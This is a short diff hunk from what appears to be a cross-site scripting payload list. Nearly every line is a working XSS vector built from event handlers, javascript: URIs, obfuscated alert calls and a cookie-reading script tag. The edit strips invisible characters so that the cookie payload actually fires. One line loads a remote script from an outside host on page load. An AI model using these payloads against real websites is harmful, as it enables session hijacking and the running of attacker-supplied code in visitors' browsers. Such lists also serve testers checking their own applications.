@@ -7,7 +7,7 @@ a onclick="alert(1)">XSS</a>
 <iframe src=javascript:alert(1)>
 <body onload=alert('XSS')>
 '"><svg/onload=import('https://lostsec.xyz/coffin/xss.js')>
-">>>>>><marquee>RXSS</marquee></head><abc><​/script><​script>alert(document.cookie)<​/script><​meta
+">>>>>><marquee>RXSS</marquee></head><abc></script><script>alert(document.cookie)</script><meta
 "><svg/onload=prompt('H6nt3r')>
 "<!--><Svg+OnLoad%3dconfirm%3f.(%2fcypher😈%2f)<!--1")
 <svg/onload=window["al"+"ert"]1337>
